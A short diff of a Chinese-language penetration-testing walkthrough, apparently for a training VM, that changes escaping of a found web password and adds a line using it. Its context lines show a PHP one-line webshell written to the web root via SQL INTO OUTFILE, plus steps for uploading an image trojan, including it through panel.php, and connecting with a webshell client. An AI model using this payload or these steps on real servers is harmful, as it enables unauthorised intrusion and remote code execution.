@@ -515,7 +515,7 @@ select '<?php @eval($_POST[cmd]);?>'INTO OUTFILE '/var/www/back.php'
 ```
 没有权限，此路不通，所以只能将收集到的Web口令去尝试其他站点位置
 ## 6.利用panel.php页面文件包含漏洞
-1. 使用在phpmyadmin中获取到的web口令biLLu：hEx_it登入，跳转到panel.php
+1. 使用在phpmyadmin中获取到的web口令biLLu：hEx\_it登入，跳转到panel.php
 2. 上传制作好的图片马
 3. 使用文件包含include图片马
 4. 菜刀连接
@@ -528,3 +528,4 @@ select '<?php @eval($_POST[cmd]);?>'INTO OUTFILE '/var/www/back.php'
 具有一句话木马功能的PHP语句插入在照片数据的最后处
 
 ### 6.2上传图片马
+使用口令biLLu：hEx\_it
